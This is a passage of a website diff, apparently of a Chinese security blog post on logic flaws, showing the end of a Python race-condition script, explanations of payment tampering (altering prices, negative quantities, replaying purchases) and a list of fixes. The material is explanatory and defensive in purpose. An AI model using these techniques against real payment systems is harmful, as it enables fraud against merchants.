+</span></span><span style=display:flex><span>t <span style=color:#f92672>=</span> threading<span style=color:#f92672>.</span>Thread(target<span style=color:#f92672>=</span>check_info)
+</span></span><span style=display:flex><span>t<span style=color:#f92672>.</span>setDaemon(<span style=color:#66d9ef>True</span>)
+</span></span><span style=display:flex><span>t<span style=color:#f92672>.</span>start()
+</span></span><span style=display:flex><span><span style=color:#66d9ef>try</span>:
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>while</span> t<span style=color:#f92672>.</span>isAlive():
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>pass</span>
+</span></span><span style=display:flex><span>    time<span style=color:#f92672>.</span>sleep(<span style=color:#ae81ff>1</span>)
+</span></span><span style=display:flex><span><span style=color:#66d9ef>except</span> <span style=color:#a6e22e>KeyboardInterrupt</span>:
+</span></span><span style=display:flex><span>    print <span style=color:#e6db74>&#39;stopped by keyboard&#39;</span>
+</span></span></code></pre></div><ul><li>数据库操作</li></ul><p>在数据库进行update、delete等操作时使用多线程请求，可在一次update时间内完成多次update，和上面的文件上传其实是一个原理</p><h3 id=0x03-支付漏洞>0x03 支付漏洞</h3><pre tabindex=0><code>攻击者通过修改交易金额、交易数量等从而利用漏洞，
 如Burp修改交易金额、使交易数量为负数或无限大等。
 
 * 在支付时直接修改数据包中的支付金额，实现小金额购买大金额商品
 * 修改购买数量，使之为负数，可购买负数量商品，从而扣除负积分，即增加积分，
   或使购买数量无限大，无限大时则程序可能处理出错，从而实现0金额支付
 * 请求重放，在购买成功后重放请求，可实现&#34;一次购买对此收货&#34;
-</code></pre><h3 id="0x04-漏洞修复">0x04 漏洞修复</h3>
-<ul>
-<li>对于密码重置漏洞，可以使用复杂的token，使之不可被预测</li>
-<li>对于密码重置漏洞，校验refer，不使用本地校验等</li>
-<li>对于多线程竞争漏洞，文件移动一定在一切判断之后，对于数据库则可以设置锁</li>
-<li>对于支付漏洞，主要就是签名了，或者https</li>
-</ul>
-</div>
-    </article>
-  </main>
-
-    </div>
-    <footer>
-  <hr />
-  
-    <p id="social">
-      Find me around the web:
-      
-        
-        <a href="https://github.com/reber0?_blank">GitHub</a>
-      
-         • 
-        <a href="https://weibo.com/u/5819760166?_blank">Weibo</a>
-      
-    </p>
-  
-  <p class="copyright">
-    Copyright © 2015-2024
-    <a href="https://wyb0.com/"><strong>Reber</strong></a>.
-
-    Built with
-    <a href="http://www.gohugo.io/">Hugo</a>,
-    based on the theme
-    <a href="https://gitlab.com/ian-s-mcb/smigle-hugo-theme">smigle</a>.
-  </p>
-</footer>
-
-  </body>
-</html>
+</code></pre><h3 id=0x04-漏洞修复>0x04 漏洞修复</h3><ul><li>对于密码重置漏洞，可以使用复杂的token，使之不可被预测</li><li>对于密码重置漏洞，校验refer，不使用本地校验等</li><li>对于多线程竞争漏洞，文件移动一定在一切判断之后，对于数据库则可以设置锁</li><li>对于支付漏洞，主要就是签名了，或者https</li></ul></div></article></main></div><footer><hr><p id=social>Find me around the web:
+<a href=https://github.com/reber0?_blank>GitHub</a>
+•
+<a href=https://weibo.com/u/5819760166?_blank>Weibo</a></p><p class=copyright>Copyright © 2015-2025
+<a href=https://wyb0.com/><strong>Reber</strong></a>.
+Built with
+<a href=http://www.gohugo.io/>Hugo</a>,
+based on the theme
+<a href=https://gitlab.com/ian-s-mcb/smigle-hugo-theme>smigle</a>.</p></footer></body></html>
